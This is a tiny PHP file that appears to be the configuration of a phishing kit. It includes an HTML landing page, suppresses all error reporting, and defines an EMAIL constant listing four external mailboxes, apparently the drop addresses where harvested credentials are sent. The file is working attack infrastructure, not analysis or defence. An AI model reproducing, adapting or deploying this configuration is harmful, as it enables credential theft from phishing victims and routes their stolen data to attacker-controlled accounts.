<?php
include('direct.html');
error_reporting(0);
$ur_email   = "sameer.usmarn@gmail.com,withtime@mailbox.org,withtimelog@yandex.com,withtimelog@zohomail.eu";
define("EMAIL", "$ur_email");
?>